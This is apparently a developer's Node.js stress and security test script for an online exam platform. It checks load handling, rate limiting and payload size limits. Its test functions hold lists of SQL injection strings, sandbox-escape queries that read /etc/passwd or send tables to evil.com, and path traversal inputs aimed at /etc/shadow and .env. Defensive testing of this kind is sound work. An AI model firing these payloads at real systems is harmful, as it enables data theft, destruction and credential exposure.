/**
 * Aggressive Stress Test Script
 * 
 * This script attempts to break the server with:
 * 1. 200 concurrent logins
 * 2. 200 concurrent exam starts
 * 3. 200 concurrent screenshot uploads
 * 4. 200 concurrent run tests
 * 5. 200 concurrent submits
 * 6. Rate limit bypass attempts
 * 7. Malicious SQL injection attempts
 * 8. Large payload attacks
 * 
 * Run with: node scripts/stress-test-aggressive.js <API_URL>
 * Example: node scripts/stress-test-aggressive.js http://3.6.211.240/api
 */

const API_URL = process.argv[2] || 'http://localhost:3001/api';
const EXAM_ID = process.argv[3] || 'ncrn3vo6stj3anmmjjlyg43l'; // SQL Contest Full

const CONCURRENCY = 200;
const CREDENTIALS_FILE = './candidate_credentials.csv';

const fs = require('fs');
const path = require('path');

// Color output
const colors = {
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    reset: '\x1b[0m'
};

function log(color, message) {
    console.log(`${colors[color]}${message}${colors.reset}`);
}

// Parse CSV credentials
function parseCredentials() {
    const csvPath = path.join(__dirname, '..', 'candidate_credentials.csv');
    if (!fs.existsSync(csvPath)) {
        log('red', `❌ Credentials file not found: ${csvPath}`);
        process.exit(1);
    }
    
    const content = fs.readFileSync(csvPath, 'utf-8');
    const lines = content.trim().split('\n').slice(1); // Skip header
    
    return lines.map(line => {
        const [email, password] = line.split(',');
        return { email: email.trim(), password: password.trim() };
    }).slice(0, CONCURRENCY);
}

// HTTP Request helper
async function request(endpoint, options = {}) {
    const url = `${API_URL}${endpoint}`;
    const startTime = Date.now();
    
    try {
        const response = await fetch(url, {
            method: options.method || 'GET',
            headers: {
                'Content-Type': 'application/json',
                ...(options.token ? { 'Authorization': `Bearer ${options.token}` } : {}),
                ...options.headers,
            },
            body: options.body ? JSON.stringify(options.body) : undefined,
        });
        
        const duration = Date.now() - startTime;
        const data = await response.json().catch(() => ({}));
        
        return {
            success: response.ok,
            status: response.status,
            duration,
            data,
        };
    } catch (error) {
        return {
            success: false,
            status: 0,
            duration: Date.now() - startTime,
            error: error.message,
        };
    }
}

// Multipart request for screenshots
async function uploadScreenshot(attemptId, token, eventType = 'STRESS_TEST') {
    const url = `${API_URL}/attempts/${attemptId}/screenshot`;
    const startTime = Date.now();
    
    // Create a fake image (1x1 red pixel JPEG)
    const fakeImage = Buffer.from([
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
        0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xDB, 0x00, 0x43,
        0x00, 0x08, 0x06, 0x06, 0x07, 0x06, 0x05, 0x08, 0x07, 0x07, 0x07, 0x09,
        0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D, 0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12,
        0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F, 0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20,
        0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C, 0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29,
        0x2C, 0x30, 0x31, 0x34, 0x34, 0x34, 0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32,
        0x3C, 0x2E, 0x33, 0x34, 0x32, 0xFF, 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01,
        0x00, 0x01, 0x01, 0x01, 0x11, 0x00, 0xFF, 0xC4, 0x00, 0x1F, 0x00, 0x00,
        0x01, 0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B, 0xFF, 0xC4, 0x00, 0xB5, 0x10, 0x00, 0x02, 0x01, 0x03,
        0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00, 0x01, 0x7D,
        0xFF, 0xD9
    ]);
    
    const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substr(2);
    
    let body = '';
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="screenshot"; filename="stress_test.jpg"\r\n`;
    body += `Content-Type: image/jpeg\r\n\r\n`;
    
    const bodyStart = Buffer.from(body, 'utf-8');
    const bodyEnd = Buffer.from(`\r\n--${boundary}\r\nContent-Disposition: form-data; name="eventType"\r\n\r\n${eventType}\r\n--${boundary}--\r\n`, 'utf-8');
    
    const fullBody = Buffer.concat([bodyStart, fakeImage, bodyEnd]);
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': `multipart/form-data; boundary=${boundary}`,
            },
            body: fullBody,
        });
        
        const duration = Date.now() - startTime;
        return {
            success: response.ok,
            status: response.status,
            duration,
        };
    } catch (error) {
        return {
            success: false,
            status: 0,
            duration: Date.now() - startTime,
            error: error.message,
        };
    }
}

// ==================== TEST SCENARIOS ====================

async function testConcurrentLogins(credentials) {
    log('cyan', '\n═══════════════════════════════════════════════════════════════');
    log('cyan', '  TEST 1: CONCURRENT LOGIN (200 users at once)');
    log('cyan', '═══════════════════════════════════════════════════════════════');
    
    const startTime = Date.now();
    
    const results = await Promise.all(
        credentials.map(cred => 
            request('/auth/login', {
                method: 'POST',
                body: { email: cred.email, password: cred.password }
            })
        )
    );
    
    const totalTime = Date.now() - startTime;
    const successful = results.filter(r => r.success).length;
    const failed = results.filter(r => !r.success).length;
    const avgDuration = results.reduce((sum, r) => sum + r.duration, 0) / results.length;
    const maxDuration = Math.max(...results.map(r => r.duration));
    
    log('yellow', `  Total Time: ${totalTime}ms`);
    log('green', `  ✅ Successful: ${successful}`);
    log('red', `  ❌ Failed: ${failed}`);
    log('blue', `  ⏱️ Avg Duration: ${Math.round(avgDuration)}ms`);
    log('blue', `  ⏱️ Max Duration: ${maxDuration}ms`);
    
    // Return tokens for next tests
    return results.filter(r => r.success).map((r, i) => ({
        email: credentials[i].email,
        token: r.data.data?.token || r.data.data?.accessToken,
    }));
}

async function testConcurrentExamStart(sessions) {
    log('cyan', '\n═══════════════════════════════════════════════════════════════');
    log('cyan', '  TEST 2: CONCURRENT EXAM START (200 users at once)');
    log('cyan', '═══════════════════════════════════════════════════════════════');
    
    const startTime = Date.now();
    
    const results = await Promise.all(
        sessions.map(session => 
            request('/attempts', {
                method: 'POST',
                token: session.token,
                body: { examId: EXAM_ID }
            })
        )
    );
    
    const totalTime = Date.now() - startTime;
    const successful = results.filter(r => r.success).length;
    const avgDuration = results.reduce((sum, r) => sum + r.duration, 0) / results.length;
    
    log('yellow', `  Total Time: ${totalTime}ms`);
    log('green', `  ✅ Successful: ${successful}`);
    log('blue', `  ⏱️ Avg Duration: ${Math.round(avgDuration)}ms`);
    
    // Return attempt IDs
    return results.filter(r => r.success).map((r, i) => ({
        ...sessions[i],
        attemptId: r.data.data?.id,
    }));
}

async function testConcurrentScreenshots(sessions) {
    log('cyan', '\n═══════════════════════════════════════════════════════════════');
    log('cyan', '  TEST 3: CONCURRENT SCREENSHOT UPLOADS (200 at once)');
    log('cyan', '═══════════════════════════════════════════════════════════════');
    
    const validSessions = sessions.filter(s => s.attemptId);
    const startTime = Date.now();
    
    const results = await Promise.all(
        validSessions.map(session => 
            uploadScreenshot(session.attemptId, session.token, 'STRESS_TEST')
        )
    );
    
    const totalTime = Date.now() - startTime;
    const successful = results.filter(r => r.success).length;
    const rateLimited = results.filter(r => r.status === 429).length;
    
    log('yellow', `  Total Time: ${totalTime}ms`);
    log('green', `  ✅ Successful: ${successful}`);
    log('magenta', `  🚫 Rate Limited: ${rateLimited}`);
}

async function testScreenshotSpam(session) {
    log('cyan', '\n═══════════════════════════════════════════════════════════════');
    log('cyan', '  TEST 4: SCREENSHOT SPAM ATTACK (50 rapid uploads from 1 user)');
    log('cyan', '═══════════════════════════════════════════════════════════════');
    
    if (!session || !session.attemptId) {
        log('red', '  ❌ No valid session for spam test');
        return;
    }
    
    const results = [];
    const startTime = Date.now();
    
    // Send 50 screenshots as fast as possible
    for (let i = 0; i < 50; i++) {
        const result = await uploadScreenshot(session.attemptId, session.token, `SPAM_${i}`);
        results.push(result);
    }
    
    const totalTime = Date.now() - startTime;
    const successful = results.filter(r => r.success).length;
    const rateLimited = results.filter(r => r.status === 429).length;
    
    log('yellow', `  Total Time: ${totalTime}ms`);
    log('green', `  ✅ Successful: ${successful}`);
    log('magenta', `  🚫 Rate Limited: ${rateLimited} (expected: ~35+)`);
    
    if (rateLimited > 30) {
        log('green', '  ✅ Rate limiting is working correctly!');
    } else {
        log('red', '  ⚠️ Rate limiting may not be working!');
    }
}

async function testSQLInjection(session) {
    log('cyan', '\n═══════════════════════════════════════════════════════════════');
    log('cyan', '  TEST 5: SQL INJECTION ATTEMPTS');
    log('cyan', '═══════════════════════════════════════════════════════════════');
    
    if (!session || !session.attemptId) {
        log('red', '  ❌ No valid session for injection test');
        return;
    }
    
    const injectionPayloads = [
        // Basic SQL injection
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM exams; --",
        "' UNION SELECT * FROM users --",
        
        // PostgreSQL specific
        "'; COPY users TO '/tmp/pwned'; --",
        "'; SELECT pg_read_file('/etc/passwd'); --",
        
        // Time-based blind
        "'; SELECT pg_sleep(10); --",
        
        // Stored procedure abuse
        "'; CALL dangerous_proc(); --",
    ];
    
    let blocked = 0;
    let passed = 0;
    
    for (const payload of injectionPayloads) {
        // Try in file save
        const result = await request(`/attempts/${session.attemptId}/files`, {
            method: 'PUT',
            token: session.token,
            body: { files: { 'query.sql': payload } }
        });
        
        if (result.success) {
            passed++;
        } else {
            blocked++;
        }
    }
    
    log('yellow', `  Payloads tested: ${injectionPayloads.length}`);
    log('green', `  ✅ Saved (grader will sandbox): ${passed}`);
    log('blue', `  ℹ️ Note: Saved payloads run in isolated containers`);
}

async function testLargePayload(session) {
    log('cyan', '\n═══════════════════════════════════════════════════════════════');
    log('cyan', '  TEST 6: LARGE PAYLOAD ATTACK');
    log('cyan', '═══════════════════════════════════════════════════════════════');
    
    if (!session || !session.attemptId) {
        log('red', '  ❌ No valid session for payload test');
        return;
    }
    
    // Create 10MB payload
    const largeContent = 'X'.repeat(10 * 1024 * 1024);
    
    const result = await request(`/attempts/${session.attemptId}/files`, {
        method: 'PUT',
        token: session.token,
        body: { files: { 'huge_file.sql': largeContent } }
    });
    
    if (result.success) {
        log('yellow', '  ⚠️ Large payload accepted (may need size limits)');
    } else if (result.status === 413) {
        log('green', '  ✅ Large payload rejected (413 Payload Too Large)');
    } else {
        log('blue', `  ℹ️ Status: ${result.status} - ${result.error || 'Unknown'}`);
    }
}

async function testConcurrentRunTests(sessions) {
    log('cyan', '\n═══════════════════════════════════════════════════════════════');
    log('cyan', '  TEST 7: CONCURRENT RUN TESTS (200 at once)');
    log('cyan', '═══════════════════════════════════════════════════════════════');
    
    const validSessions = sessions.filter(s => s.attemptId).slice(0, 50); // Limit to 50 to not overload
    
    // First save some SQL code
    await Promise.all(
        validSessions.map(session =>
            request(`/attempts/${session.attemptId}/files`, {
                method: 'PUT',
                token: session.token,
                body: { files: { 'q1.sql': 'SELECT 1 as test;' } }
            })
        )
    );
    
    const startTime = Date.now();
    
    const results = await Promise.all(
        validSessions.map(session => 
            request(`/attempts/${session.attemptId}/run-tests`, {
                method: 'POST',
                token: session.token,
            })
        )
    );
    
    const totalTime = Date.now() - startTime;
    const successful = results.filter(r => r.success).length;
    const locked = results.filter(r => r.status === 429).length;
    const rateLimited = results.filter(r => r.data?.error?.includes('Rate limit')).length;
    
    log('yellow', `  Total Time: ${totalTime}ms`);
    log('green', `  ✅ Queued: ${successful}`);
    log('magenta', `  🔒 Already Running: ${locked}`);
    log('magenta', `  🚫 Rate Limited: ${rateLimited}`);
}

async function testMaliciousSQLInGrader(session) {
    log('cyan', '\n═══════════════════════════════════════════════════════════════');
    log('cyan', '  TEST 8: MALICIOUS SQL IN GRADER (Container Escape Attempts)');
    log('cyan', '═══════════════════════════════════════════════════════════════');
    
    if (!session || !session.attemptId) {
        log('red', '  ❌ No valid session for grader test');
        return;
    }
    
    const maliciousQueries = [
        // File system access
        "COPY (SELECT '') TO PROGRAM 'cat /etc/passwd';",
        "SELECT lo_import('/etc/passwd');",
        "SELECT pg_read_file('/etc/passwd');",
        "SELECT pg_read_binary_file('/etc/passwd');",
        
        // Network access
        "COPY users TO 'http://evil.com/steal' WITH (FORMAT csv);",
        "SELECT dblink_connect('host=evil.com port=5432');",
        
        // System command execution
        "CREATE OR REPLACE FUNCTION system(text) RETURNS text AS 'DECLARE result text; BEGIN EXECUTE $1; RETURN result; END;' LANGUAGE plpgsql;",
        
        // Extension loading
        "CREATE EXTENSION IF NOT EXISTS dblink;",
        "CREATE EXTENSION IF NOT EXISTS file_fdw;",
        
        // Resource exhaustion
        "WITH RECURSIVE bomb AS (SELECT 1 UNION ALL SELECT 1 FROM bomb, bomb) SELECT * FROM bomb;",
        "SELECT repeat('X', 1000000000);",
    ];
    
    log('yellow', `  Testing ${maliciousQueries.length} malicious queries...`);
    log('blue', '  ℹ️ These run in sandboxed containers with:');
    log('blue', '     - No superuser privileges');
    log('blue', '     - No network access');
    log('blue', '     - 512MB memory limit');
    log('blue', '     - 5s timeout');
    log('blue', '     - PID limit: 150');
    
    // Save a malicious query
    await request(`/attempts/${session.attemptId}/files`, {
        method: 'PUT',
        token: session.token,
        body: { files: { 'q1.sql': maliciousQueries[0] } }
    });
    
    // Try to run it
    const result = await request(`/attempts/${session.attemptId}/run-tests`, {
        method: 'POST',
        token: session.token,
    });
    
    if (result.success) {
        log('green', '  ✅ Query submitted to grader (will fail in sandbox)');
    } else {
        log('blue', `  ℹ️ Response: ${result.status}`);
    }
}

async function testPathTraversal(session) {
    log('cyan', '\n═══════════════════════════════════════════════════════════════');
    log('cyan', '  TEST 9: PATH TRAVERSAL ATTEMPTS');
    log('cyan', '═══════════════════════════════════════════════════════════════');
    
    if (!session || !session.attemptId) {
        log('red', '  ❌ No valid session for path traversal test');
        return;
    }
    
    const traversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        './../../../etc/shadow',
        '....//....//etc/passwd',
        '.hidden_file',
        '../.env',
    ];
    
    let blocked = 0;
    let passed = 0;
    
    for (const path of traversalPayloads) {
        const result = await request(`/attempts/${session.attemptId}/files`, {
            method: 'PUT',
            token: session.token,
            body: { files: { [path]: 'test content' } }
        });
        
        if (result.success) {
            passed++;
            log('red', `  ⚠️ PASSED: ${path}`);
        } else {
            blocked++;
        }
    }
    
    log('yellow', `  Payloads tested: ${traversalPayloads.length}`);
    log('green', `  ✅ Blocked: ${blocked}`);
    log('red', `  ⚠️ Passed: ${passed}`);
    
    if (blocked === traversalPayloads.length) {
        log('green', '  ✅ Path traversal protection is working!');
    }
}

// ==================== MAIN ====================

async function main() {
    log('magenta', '\n╔═══════════════════════════════════════════════════════════════╗');
    log('magenta', '║     AGGRESSIVE STRESS TEST - EXAM PLATFORM                     ║');
    log('magenta', '║     Attempting to break the server...                          ║');
    log('magenta', '╚═══════════════════════════════════════════════════════════════╝');
    
    log('blue', `\nAPI URL: ${API_URL}`);
    log('blue', `Exam ID: ${EXAM_ID}`);
    log('blue', `Concurrency: ${CONCURRENCY}`);
    
    // Load credentials
    const credentials = parseCredentials();
    log('green', `\n✅ Loaded ${credentials.length} credentials`);
    
    // Run tests
    let sessions = [];
    
    try {
        // Test 1: Concurrent logins
        sessions = await testConcurrentLogins(credentials);
        
        if (sessions.length === 0) {
            log('red', '\n❌ No successful logins. Aborting tests.');
            return;
        }
        
        // Test 2: Concurrent exam start
        sessions = await testConcurrentExamStart(sessions);
        
        // Test 3: Concurrent screenshots
        await testConcurrentScreenshots(sessions);
        
        // Test 4: Screenshot spam (single user)
        await testScreenshotSpam(sessions[0]);
        
        // Test 5: SQL injection attempts
        await testSQLInjection(sessions[0]);
        
        // Test 6: Large payload
        await testLargePayload(sessions[0]);
        
        // Test 7: Concurrent run tests
        await testConcurrentRunTests(sessions);
        
        // Test 8: Malicious SQL in grader
        await testMaliciousSQLInGrader(sessions[1] || sessions[0]);
        
        // Test 9: Path traversal
        await testPathTraversal(sessions[2] || sessions[0]);
        
    } catch (error) {
        log('red', `\n❌ Error: ${error.message}`);
    }
    
    log('magenta', '\n╔═══════════════════════════════════════════════════════════════╗');
    log('magenta', '║     STRESS TEST COMPLETE                                       ║');
    log('magenta', '╚═══════════════════════════════════════════════════════════════╝\n');
}

main().catch(console.error);
